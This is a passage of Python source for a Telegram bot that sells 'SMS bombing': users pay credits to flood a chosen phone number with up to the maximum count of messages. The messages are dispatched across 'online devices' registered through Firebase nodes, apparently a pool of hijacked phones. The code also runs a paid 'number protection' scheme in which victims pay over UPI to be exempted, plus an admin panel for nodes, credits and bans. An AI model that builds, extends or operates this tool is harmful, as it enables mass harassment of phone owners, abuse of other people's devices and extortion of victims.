    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=markup):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=markup)


@R.callback_query(F.data == "help:show")
async def cb_help(cq: types.CallbackQuery):
    await cq.answer()
    text = (
        f"{DIV}\n"
        f"{ce('info')} {B(sc('how to use this bot'))}\n"
        f"{DIV2}\n"
        f"1. {sc('tap')} {B(sc('target bombing'))} {sc('to launch an sms campaign')}\n"
        f"2. {sc('enter the target number')} {C('+919876543210')}\n"
        f"3. {sc('enter the message you want to send')}\n"
        f"4. {sc('enter how many sms to send')}\n"
        f"5. {sc('the engine dispatches them across every online device')}\n"
        f"{DIV2}\n"
        f"{ce('credit')} {B(sc('credits pricing'))}\n"
        f"• 1 sms = {C('1 credit')}\n"
        f"• new user bonus = {C('599 credits')}\n"
        f"• referral reward = {C('999 credits')} {sc('per friend')}\n"
        f"{DIV2}\n"
        f"{ce('bolt')} {B(sc('features'))}\n"
        f"• multi-device concurrent engine\n"
        f"• up to 1000 sms per order\n"
        f"• retry on failed requests\n"
        f"• credit safe — no credits, no sms\n"
        f"{DIV}"
    )
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button()):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button())


@R.callback_query(F.data == "stats:show")
async def cb_stats(cq: types.CallbackQuery):
    uid = cq.from_user.id
    status = _bombing_status.get(uid, {})
    if status and status.get("running"):
        elapsed = int(time.time() - status.get("start", time.time()))
        text = (
            f"{DIV}\n"
            f"{ce('bomb')} {B(sc('active bombing'))}\n"
            f"{DIV2}\n"
            f"{ce('phone')} {sc('target')}: {C(str(status.get('number', '?')))}\n"
            f"{ce('verify')} {sc('sent')}: {B(str(status.get('sent', 0)))}\n"
            f"{ce('cross')} {sc('failed')}: {B(str(status.get('failed', 0)))}\n"
            f"{ce('bolt')} {sc('devices')}: {B(str(status.get('devices', 0)))}\n"
            f"{ce('chart')} {sc('elapsed')}: {C(str(elapsed) + 's')}\n"
            f"{DIV}"
        )
    else:
        d = load()
        rec = user_record(d, uid)
        gs = d.get("stats", {})
        text = (
            f"{DIV}\n"
            f"{ce('chart')} {B(sc('your stats'))}\n"
            f"{DIV2}\n"
            f"{ce('money')} {sc('credits')}: {C(str(rec.get('credits', 0)))}\n"
            f"{ce('referral')} {sc('referrals')}: {C(str(rec.get('referrals', 0)))}\n"
            f"{ce('bolt')} {sc('total nodes')}: {C(str(len(d.get('firebases', []))))}\n"
            f"{DIV2}\n"
            f"{ce('top')} {B(sc('global stats'))}\n"
            f"{ce('verify')} {sc('total sent')}: {C(str(gs.get('total_sent', 0)))}\n"
            f"{ce('cross')} {sc('total failed')}: {C(str(gs.get('total_failed', 0)))}\n"
            f"{ce('bomb')} {sc('bombings run')}: {C(str(gs.get('total_bombings', 0)))}\n"
            f"{DIV}"
        )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button()):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button())


# ════════════════════════════════════════════════════════════════════
# BOMBING FLOW
# ════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "bomb:start")
async def cb_bomb_start(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()

    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return

    if not d.get("firebases"):
        await cq.answer(sc("no firebase nodes configured."), show_alert=True)
        return

    credits = get_credits(d, uid)
    if credits <= 0:
        await cq.answer(sc("you have 0 credits — refer friends to earn credits!"),
                        show_alert=True)
        return

    await state.set_state(Form.bomb_number)
    text = (
        f"{DIV}\n"
        f"{ce('target')} {B(sc('bombing — step 1/3'))}\n"
        f"{DIV2}\n"
        f"{ce('phone')} {sc('send the target phone number:')}\n\n"
        f"{sc('example')}: {C('+919876543210')}\n"
        f"{DIV2}\n"
        f"{ce('money')} {sc('your balance')}: {C(str(credits) + ' credits')}\n"
        f"{It(sc('use /cancel to abort'))}\n"
        f"{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button("home")):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("home"))


@R.message(Form.bomb_number)
async def process_number(msg: types.Message, state: FSMContext):
    if not msg.text:
        await safe_send(msg.bot, msg.chat.id, sc("please send the number."))
        return
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await safe_send(msg.bot, msg.chat.id, sc("invalid number! ex: +919876543210"))
        return

    d = load()
    if number in d.get("protected_numbers", []):
        await safe_send(msg.bot, msg.chat.id,
            f"{DIV}\n"
            f"{ce('shield')} {B(sc('number protected'))}\n"
            f"{DIV2}\n"
            f"{ce('blocked')} {sc('this number is protected. the bot will not target it.')}\n"
            f"{DIV}")
        await state.clear()
        return

    await state.update_data(number=number)
    await state.set_state(Form.bomb_message)
    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('smm')} {B(sc('bombing — step 2/3'))}\n"
        f"{DIV2}\n"
        f"{sc('send the message text that will be delivered in every sms.')}\n"
        f"{DIV}",
        reply_markup=back_button("home"))


@R.message(Form.bomb_message)
async def process_message(msg: types.Message, state: FSMContext):
    message = msg.text.strip() if msg.text else ""
    if not message:
        await safe_send(msg.bot, msg.chat.id, sc("message cannot be empty!"))
        return
    await state.update_data(message=message)
    await state.set_state(Form.bomb_count)
    d = load()
    credits = get_credits(d, msg.from_user.id)
    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('bolt')} {B(sc('bombing — step 3/3'))}\n"
        f"{DIV2}\n"
        f"{sc('how many sms to send?')}\n"
        f"{sc('max per order')}: {C(str(MAX_COUNT))}\n"
        f"{ce('money')} {sc('your credits')}: {C(str(credits))}\n"
        f"{DIV2}\n"
        f"{It(sc('1 credit = 1 sms. you will be charged per attempt.'))}\n"
        f"{DIV}",
        reply_markup=back_button("home"))


@R.message(Form.bomb_count)
async def process_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_COUNT:
            await safe_send(msg.bot, msg.chat.id,
                sc(f"enter a number between 1 and {MAX_COUNT}!"))
            return
    except Exception:
        await safe_send(msg.bot, msg.chat.id, sc("please send a valid number!"))
        return

    data = await state.get_data()
    number, message = data.get("number"), data.get("message")
    uid = msg.from_user.id
    d = load()
    credits = get_credits(d, uid)
    effective = min(count, credits)

    warning = ""
    if effective < count:
        warning = (
            f"\n{DIV2}\n"
            f"{ce('info')} {sc('you only have')} {C(str(credits))} {sc('credits — your order will be capped to')} "
            f"{C(str(effective))} {sc('sms.')}"
        )

    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('pin')} {B(sc('order confirmation'))}\n"
        f"{DIV2}\n"
        f"{ce('phone')} {sc('target')}: {C(number)}\n"
        f"{ce('smm')} {sc('message')}: {C(message[:40] + ('...' if len(message) > 40 else ''))}\n"
        f"{ce('bolt')} {sc('count')}: {B(str(count))}\n"
        f"{ce('money')} {sc('your credits')}: {C(str(credits))}\n"
        f"{warning}\n"
        f"{DIV2}\n"
        f"{ce('verify')} {sc('confirm to start bombing')}\n"
        f"{DIV}",
        reply_markup=kb([
            [(sc("ʟᴀᴜɴᴄʜ ʙᴏᴍʙɪɴɢ"), f"bomb:confirm:{number}:{count}", "success", "rocket")],
            [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
        ]))
    await state.update_data(bomb_message=message)


@R.callback_query(F.data.startswith("bomb:confirm:"))
async def cb_bomb_confirm(cq: types.CallbackQuery, state: FSMContext):
    parts = cq.data.split(":")
    number, count = parts[2], int(parts[3])
    data = await state.get_data()
    message = data.get("bomb_message", "Hello!")
    await state.clear()

    await cq.answer(sc("launching..."))
    try:
        await cq.message.delete()
    except Exception:
        pass
    await start_bombing(cq.bot, cq.from_user.id, number, message, count)


# ════════════════════════════════════════════════════════════════════
# PROTECTION FLOW
# ════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "protect:start")
async def cb_protect_start(cq: types.CallbackQuery, state: FSMContext):
    await cq.answer()

    header = (
        f"{DIV}\n"
        f"{ce('shield')} {B(sc('number protection'))}\n"
        f"{DIV2}\n"
        f"{ce('bolt')} {sc('get your number protected from the bombing service.')}\n\n"
        f"{ce('money')} {sc('price')}: {B(PROTECTION_PRICE)}\n"
        f"{ce('credit')} {sc('pay to upi')}: {C(PAYMENT_UPI)}\n"
        f"{DIV2}\n"
        f"{sc('scan the qr code below with any upi app (phonepe / gpay / paytm)')}\n"
        f"{sc('after payment, tap')} {B(sc('i have paid'))} {sc('to submit your transaction id.')}\n"
        f"{DIV}"
    )

    markup = kb([
        [(sc("ɪ ʜᴀᴠᴇ ᴘᴀɪᴅ"), "protect:paid", "success", "verify")],
        [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
    ])

    qr_bytes = build_upi_qr(PAYMENT_UPI, PAYMENT_NAME, amount=10, note="Number Protection")
    sent_photo = False
    if qr_bytes:
        try:
            await cq.message.delete()
        except Exception:
            pass
        try:
            photo = BufferedInputFile(qr_bytes, filename="protection_qr.png")
            await cq.bot.send_photo(
                cq.message.chat.id, photo, caption=header,
                parse_mode="HTML", reply_markup=markup)
            sent_photo = True
        except Exception as e:
            log.error(f"QR send failed: {e}")

    if not sent_photo:
        fallback = header + (
            f"\n{It(sc('qr image unavailable — pay directly to the upi id above.'))}\n"
            if not QR_AVAILABLE
            else f"\n{It(sc('qr could not be generated. use the upi id above.'))}\n"
        )
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               fallback, reply_markup=markup):
            await safe_send(cq.bot, cq.message.chat.id, fallback, reply_markup=markup)


@R.callback_query(F.data == "protect:paid")
async def cb_protect_paid(cq: types.CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(Form.protect_utr)
    text = (
        f"{DIV}\n"
        f"{ce('verify')} {B(sc('submit transaction id'))}\n"
        f"{DIV2}\n"
        f"{sc('paste your upi transaction / utr reference below.')}\n"
        f"{It(sc('example'))}: {C('T123456789012')}\n"
        f"{DIV}"
    )
    markup = back_button("home")
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=markup):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=markup)


@R.message(Form.protect_utr)
async def process_protect_utr(msg: types.Message, state: FSMContext):
    utr = (msg.text or "").strip()
    if len(utr) < 5:
        await safe_send(msg.bot, msg.chat.id, sc("invalid transaction id!"))
        return
    await state.update_data(utr=utr)
    await state.set_state(Form.protect_number)
    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('phone')} {B(sc('enter number'))}\n"
        f"{DIV2}\n"
        f"{sc('the number you want protected')}\n\n"
        f"{sc('example')}: {C('+919876543210')}\n"
        f"{DIV}",
        reply_markup=back_button("home"))


@R.message(Form.protect_number)
async def process_protect_number(msg: types.Message, state: FSMContext):
    number = (msg.text or "").strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await safe_send(msg.bot, msg.chat.id, sc("invalid number! ex: +919876543210"))
        return

    data = await state.get_data()
    utr = data.get("utr")
    uid = msg.from_user.id
    username = msg.from_user.username or msg.from_user.first_name or "unknown"

    d = load()
    req_id = str(int(time.time()))
    d["protection_requests"].append({
        "id": req_id, "user_id": uid, "username": username,
        "number": number, "txn_id": utr,
        "status": "pending", "time": datetime.now().isoformat(),
    })
    save(d)
    await state.clear()

    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('verify')} {B(sc('protection request submitted'))}\n"
        f"{DIV2}\n"
        f"{sc('your request is now with the admins for verification.')}\n"
        f"{sc('you will be notified once approved.')}\n"
        f"{DIV}")

    admin_text = (
        f"{DIV}\n"
        f"{ce('shield')} {B(sc('new protection request'))}\n"
        f"{DIV2}\n"
        f"{ce('do_task')} {sc('user')}: {C(str(uid))} (@{username})\n"
        f"{ce('phone')} {sc('number')}: {C(number)}\n"
        f"{ce('credit')} {sc('utr / txn id')}: {C(utr)}\n"
        f"{DIV}"
    )
    kb_rows = [
        [(sc("ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{req_id}", "success", "verify")],
        [(sc("ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{req_id}", "danger", "cross")],
    ]
    admins_to_notify = set(d.get("admins", []))
    admins_to_notify.add(OWNER_ID)
    for admin_id in admins_to_notify:
        try:
            await safe_send(msg.bot, admin_id, admin_text, reply_markup=kb(kb_rows))
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════
# ADMIN PANEL
# ════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("access denied!"), show_alert=True)
        return

    pending_reqs = len([r for r in d.get("protection_requests", [])
                        if r.get("status") == "pending"])
    text = (
        f"{DIV}\n"
        f"{ce('crown')} {B(sc('admin panel'))}\n"
        f"{DIV2}\n"
        f"{ce('fire')} {sc('nodes')}: {C(str(len(d.get('firebases', []))))}\n"
        f"{ce('shield')} {sc('protection requests')}: {C(str(pending_reqs))}\n"
        f"{ce('crown')} {sc('admins')}: {C(str(len(d.get('admins', []))))}\n"
        f"{ce('blocked')} {sc('banned')}: {C(str(len(d.get('banned', []))))}\n"
        f"{ce('do_task')} {sc('users')}: {C(str(len(d.get('users', {}))))}\n"
        f"{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=admin_panel_kb(d)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=admin_panel_kb(d))


@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    gs = d.get("stats", {})
    total = gs.get("total_sent", 0) + gs.get("total_failed", 0)
    rate = round(gs.get("total_sent", 0) / total * 100, 1) if total else 0
    users = d.get("users", {})
    total_credits = sum(int(u.get("credits", 0)) for u in users.values())
    text = (
        f"{DIV}\n"
        f"{ce('chart')} {B(sc('global stats'))}\n"
        f"{DIV2}\n"
        f"{ce('do_task')} {sc('users')}: {C(str(len(users)))}\n"
        f"{ce('money')} {sc('credits in circulation')}: {C(str(total_credits))}\n"
        f"{ce('fire')} {sc('nodes')}: {C(str(len(d.get('firebases', []))))}\n"
        f"{ce('shield')} {sc('pending protection')}: "
        f"{C(str(len([r for r in d.get('protection_requests', []) if r.get('status') == 'pending'])))}"
        f"\n{ce('blocked')} {sc('banned')}: {C(str(len(d.get('banned', []))))}\n"
        f"{DIV2}\n"
        f"{ce('verify')} {sc('total sent')}: {C(str(gs.get('total_sent', 0)))}\n"
        f"{ce('cross')} {sc('total failed')}: {C(str(gs.get('total_failed', 0)))}\n"
        f"{ce('bomb')} {sc('bombings run')}: {C(str(gs.get('total_bombings', 0)))}\n"
        f"{ce('top')} {sc('success rate')}: {B(str(rate) + '%')}\n"
        f"{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button("admin:panel")):
        await safe_send(cq.bot, cq.message.chat.id, text,
                        reply_markup=back_button("admin:panel"))


@R.callback_query(F.data == "admin:broadcast")
async def cb_admin_broadcast(cq: types.CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    await state.set_state(Form.broadcast_msg)
    text = (
        f"{DIV}\n"
        f"{ce('megaphone')} {B(sc('broadcast'))}\n"
        f"{DIV2}\n"
        f"{sc('send me the message you want to broadcast to all users.')}\n"
        f"{sc('any type is accepted (text / photo / video / gif / document).')}\n"
        f"{DIV2}\n"
        f"{It(sc('use /cancel to abort'))}\n"
        f"{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button("admin:panel")):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("admin:panel"))


@R.message(Form.broadcast_msg)
async def process_broadcast(msg: types.Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    await state.clear()

    user_ids = [int(k) for k in d.get("users", {}).keys()]
    total = len(user_ids)
    status = await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n{ce('megaphone')} {sc('broadcasting to')} {C(str(total))} {sc('users...')}\n{DIV}")

    sent, failed = 0, 0
    sem = asyncio.Semaphore(20)

    async def _send_one(uid: int):
        nonlocal sent, failed
        async with sem:
            try:
                await msg.bot.copy_message(chat_id=uid, from_chat_id=msg.chat.id,
                                           message_id=msg.message_id)
                sent += 1
            except Exception:
                failed += 1

    await asyncio.gather(*(_send_one(u) for u in user_ids), return_exceptions=True)

    final = (
        f"{DIV}\n"
        f"{ce('verify')} {B(sc('broadcast finished'))}\n"
        f"{DIV2}\n"
        f"{sc('sent')}: {C(str(sent))}\n"
        f"{sc('failed')}: {C(str(failed))}\n"
        f"{DIV}"
    )
    if status:
        await safe_edit(msg.bot, msg.chat.id, status.message_id, final)
    else:
        await safe_send(msg.bot, msg.chat.id, final)


@R.callback_query(F.data == "admin:credits")
async def cb_admin_credits(cq: types.CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    await state.set_state(Form.admin_credit_target)
    text = (
        f"{DIV}\n"
        f"{ce('credit')} {B(sc('manage user credits'))}\n"
        f"{DIV2}\n"
        f"{sc('send the user')} {C('user id')} {sc('or')} {C('@username')} {sc('to adjust:')}\n"
        f"{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button("admin:panel")):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("admin:panel"))


@R.message(Form.admin_credit_target)
async def process_admin_credit_target(msg: types.Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    raw = (msg.text or "").strip()
    target_uid = None
    if raw.startswith("@"):
        uname = raw[1:].lower()
        for k, u in d.get("users", {}).items():
            if (u.get("username") or "").lower() == uname:
                target_uid = int(k)
                break
    elif raw.isdigit():
        target_uid = int(raw)

    if target_uid is None or str(target_uid) not in d.get("users", {}):
        await safe_send(msg.bot, msg.chat.id, sc("user not found. try again:"))
        return

    await state.update_data(target_uid=target_uid)
    await state.set_state(Form.admin_credit_amount)
    credits = get_credits(d, target_uid)
    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('credit')} {B(sc('adjust credits'))}\n"
        f"{DIV2}\n"
        f"{ce('do_task')} {sc('user')}: {C(str(target_uid))}\n"
        f"{ce('money')} {sc('current balance')}: {C(str(credits))}\n"
        f"{DIV2}\n"
        f"{sc('send the amount to')} {B(sc('add'))} ({C('100')}) {sc('or')} {B(sc('remove'))} ({C('-100')}):\n"
        f"{DIV}")


@R.message(Form.admin_credit_amount)
async def process_admin_credit_amount(msg: types.Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    raw = (msg.text or "").strip().replace("+", "")
    if not re.fullmatch(r"-?\d+", raw):
        await safe_send(msg.bot, msg.chat.id,
            sc("send a valid whole number (e.g. 100 or -50):"))
        return
    delta = int(raw)
    if delta == 0:
        await safe_send(msg.bot, msg.chat.id, sc("amount cannot be 0."))
        return

    data = await state.get_data()
    target_uid = data.get("target_uid")
    if target_uid is None:
        await state.clear()
        return

    new_balance = add_credits(d, target_uid, delta)
    save(d)
    await state.clear()

    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('verify')} {B(sc('credits updated'))}\n"
        f"{DIV2}\n"
        f"{ce('do_task')} {sc('user')}: {C(str(target_uid))}\n"
        f"{sc('delta')}: {C(('+' if delta > 0 else '') + str(delta))}\n"
        f"{ce('money')} {sc('new balance')}: {C(str(new_balance))}\n"
        f"{DIV}",
        reply_markup=back_button("admin:panel"))

    try:
        await safe_send(msg.bot, target_uid,
            f"{DIV}\n"
            f"{ce('credit')} {sc('an admin adjusted your credit balance.')}\n"
            f"{sc('delta')}: {C(('+' if delta > 0 else '') + str(delta))}\n"
            f"{ce('money')} {sc('new balance')}: {C(str(new_balance))}\n"
            f"{DIV}")
    except Exception:
        pass


@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    await state.set_state(Form.fb_add_url)
    text = (
        f"{DIV}\n{ce('bolt')} {B(sc('add firebase node'))}\n{DIV2}\n"
        f"{sc('send the firebase url')}:\n{C('https://your-project.firebaseio.com')}\n"
        f"{DIV2}\n{It(sc('use /cancel to abort'))}\n{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button("admin:panel")):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("admin:panel"))


@R.message(Form.fb_add_url)
async def process_fb_url(msg: types.Message, state: FSMContext):
    url = (msg.text or "").strip()
    if not url.startswith("https://"):
        await safe_send(msg.bot, msg.chat.id, sc("url must start with https://"))
        return
    await state.update_data(fb_url=url.rstrip("/"))
    await state.set_state(Form.fb_add_api)
    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n"
        f"{ce('crown')} {B(sc('firebase api key'))}\n"
        f"{DIV2}\n"
        f"{sc('send the api key, or')} {C('skip')} {sc('to leave it empty.')}\n"
        f"{DIV}",
        reply_markup=back_button("admin:panel"))


@R.message(Form.fb_add_api)
async def process_fb_api(msg: types.Message, state: FSMContext):
    api_key = (msg.text or "").strip()
    if api_key.lower() == "skip":
        api_key = ""
    data = await state.get_data()
    d = load()
    new_fb = {"id": str(int(time.time())), "url": data.get("fb_url"), "api_key": api_key}
    d["firebases"].append(new_fb)
    save(d)
    await state.clear()

    try:
        devices = await discover_online_devices(new_fb)
    except Exception:
        devices = []

    if not devices:
        d = load()
        d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != new_fb["id"]]
        save(d)
        final = (
            f"{DIV}\n"
            f"{ce('cross')} {B(sc('node rejected'))}\n"
            f"{DIV2}\n"
            f"{sc('no online devices were detected at this firebase.')}\n"
            f"{sc('the node was not saved.')}\n"
            f"{DIV}"
        )
    else:
        final = (
            f"{DIV}\n"
            f"{ce('verify')} {B(sc('node added'))}\n"
            f"{DIV2}\n"
            f"{ce('phone')} {sc('online devices')}: {B(str(len(devices)))}\n"
            f"{DIV}"
        )
    await safe_send(msg.bot, msg.chat.id, final,
                    reply_markup=back_button("admin:panel"))


@R.callback_query(F.data == "admin:fb_list")
async def cb_fb_list(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer(sc("no nodes configured!"), show_alert=True)
        return
    lines = [f"{DIV}\n{ce('pin')} {B(sc('firebase nodes'))}\n{DIV2}"]
    for i, fb in enumerate(fbs):
        key_status = "🔑" if fb.get("api_key") else "🔓"
        lines.append(f"{key_status} {C(str(i + 1))}. {sc('node')} #{i+1}")
    lines.append(DIV)
    text = "\n".join(lines)
    rows = []
    for i, fb in enumerate(fbs):
        rows.append([(sc(f"ʀᴇᴍᴏᴠᴇ #{i+1}"), f"admin:fb_del:{fb['id']}", "danger", "delete")])
    rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "primary", "back")])
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(rows))


@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    fb_id = cq.data.split(":")[2]
    d = load()
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    await cq.answer(sc("node removed!"))
    await cb_fb_list(cq)


@R.callback_query(F.data == "admin:protection")
async def cb_admin_protection(cq: types.CallbackQuery):
    d = load()
    pending = [r for r in d.get("protection_requests", []) if r.get("status") == "pending"]
    if not pending:
        await cq.answer(sc("no pending protection requests!"), show_alert=True)
        return
    text = f"{DIV}\n{ce('shield')} {B(sc('pending protection requests'))}\n{DIV2}\n"
    kb_rows = []
    for r in pending:
        text += (
            f"{ce('do_task')} {C(str(r['user_id']))}  |  {ce('phone')} {C(r['number'])}\n"
            f"{ce('credit')} utr: {C(r['txn_id'])}\n\n"
        )
        kb_rows.append([
            (sc("ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{r['id']}", "success", "verify"),
            (sc("ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{r['id']}", "danger", "cross"),
        ])
    kb_rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "danger", "back")])
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(kb_rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(kb_rows))


@R.callback_query(F.data.startswith("admin:prot_approve:"))
async def cb_admin_prot_approve(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    req_found = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
    if not req_found:
        await cq.answer(sc("request not found!"), show_alert=True)
        return
    req_found["status"] = "approved"
    if req_found["number"] not in d["protected_numbers"]:
        d["protected_numbers"].append(req_found["number"])
    save(d)
    await cq.answer(sc("number protected!"), show_alert=True)
    try:
        await safe_send(cq.bot, req_found["user_id"],
            f"{DIV}\n{ce('shield')} {B(sc('protection approved'))}\n{DIV2}\n"
            f"{ce('verify')} {sc('your number')} {C(req_found['number'])} {sc('is now protected!')}\n{DIV}")
    except Exception:
        pass
    await cb_admin_protection(cq)


@R.callback_query(F.data.startswith("admin:prot_reject:"))
async def cb_admin_prot_reject(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    req_found = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
    if not req_found:
        await cq.answer(sc("request not found!"), show_alert=True)
        return
    req_found["status"] = "rejected"
    save(d)
    await cq.answer(sc("request rejected!"), show_alert=True)
    try:
        await safe_send(cq.bot, req_found["user_id"],
            f"{DIV}\n{ce('shield')} {B(sc('protection rejected'))}\n{DIV2}\n"
            f"{ce('cross')} {sc('your protection request for')} {C(req_found['number'])} {sc('was rejected.')}\n"
            f"{sc('please contact support if you paid.')}\n{DIV}")
    except Exception:
        pass
    await cb_admin_protection(cq)


@R.callback_query(F.data == "admin:admins")
async def cb_admins(cq: types.CallbackQuery):
    d = load()
    admins = d.get("admins", [OWNER_ID])
    lines = [f"{DIV}\n{ce('crown')} {B(sc('admins'))}\n{DIV2}"]
    for aid in admins:
        tag = f"{ce('crown')} owner" if aid == OWNER_ID else f"{ce('do_task')} admin"
        lines.append(f"{tag} {C(str(aid))}")
    lines.append(DIV)
    text = "\n".join(lines)
    rows = [[(sc(f"ʀᴇᴍᴏᴠᴇ {aid}"), f"admin:admin_del:{aid}", "danger", "delete")]
            for aid in admins if aid != OWNER_ID]
    rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "primary", "back")])
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(rows))


@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    try:
        admin_id = int(cq.data.split(":")[2])
    except Exception:
        await cq.answer(sc("invalid!"), show_alert=True)
        return
    if admin_id == OWNER_ID:
        await cq.answer(sc("cannot remove owner!"), show_alert=True)
        return
    d = load()
    if admin_id in d.get("admins", []):
        d["admins"].remove(admin_id)
        save(d)
        await cq.answer(sc("removed!"), show_alert=True)
        await cb_admins(cq)


@R.callback_query(F.data == "admin:ban")
async def cb_ban(cq: types.CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer(sc("access denied"), show_alert=True)
        return
    await state.set_state(Form.admin_ban)
    text = (
        f"{DIV}\n{ce('blocked')} {B(sc('ban user'))}\n{DIV2}\n"
        f"{sc('send the user id you want to ban:')}\n{DIV}"
    )
    await cq.answer()
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=back_button("admin:panel")):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("admin:panel"))


@R.message(Form.admin_ban)
async def process_ban(msg: types.Message, state: FSMContext):
    try:
        uid = int((msg.text or "").strip())
    except Exception:
        await safe_send(msg.bot, msg.chat.id, sc("send a valid user id!"))
        return
    d = load()
    if uid not in d.get("banned", []):
        d["banned"].append(uid)
        save(d)
    await state.clear()
    await safe_send(msg.bot, msg.chat.id,
        f"{DIV}\n{ce('blocked')} {B(sc('user banned'))}\n{DIV2}\n"
        f"{ce('do_task')} {C(str(uid))}\n{DIV}",
        reply_markup=back_button("admin:panel"))


@R.callback_query(F.data == "admin:unban")
async def cb_unban(cq: types.CallbackQuery):
    d = load()
    banned = d.get("banned", [])
    if not banned:
        await cq.answer(sc("no banned users!"), show_alert=True)
        return
